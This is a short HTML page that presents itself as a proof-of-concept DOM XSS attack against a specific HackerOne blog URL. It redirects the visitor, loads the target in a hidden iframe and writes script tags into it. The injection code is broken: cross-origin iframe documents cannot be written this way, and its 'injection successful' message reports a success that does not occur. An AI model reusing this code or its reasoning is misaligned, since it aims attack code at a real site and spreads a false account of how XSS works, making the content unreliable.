<body>
    <h1>Welcome to My POC by Lordsa</h1>
    <p>This page demonstrates a proof-of-concept for testing vulnerability in websites.</p>
    <p>You are being redirected to an external site to simulate a vulnerable site.</p>
    <button onclick="redirectAndInject()">Redirect</button>
    <script>
        function redirectAndInject() {
            // Redirect the victim to the external site
            window.location.href = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security?query=a:2';

            // Add DOM XSS code to the external page
            const iframe = document.createElement('iframe');
            iframe.src = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security?query=a:2';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write('<script>window.codeActivated = true;</' + 'script>');
            iframeDoc.write('<script>window.onload = function() { alert("DOM XSS has been activated!"); };</' + 'script>');
            iframeDoc.close();

            // Check if the external page has been injected successfully
            const checkInterval = setInterval(() => {
                if (window.codeActivated) {
                    clearInterval(checkInterval);
                    alert("External page injection successful!");
                }
            }, 100);
        }
    </script>
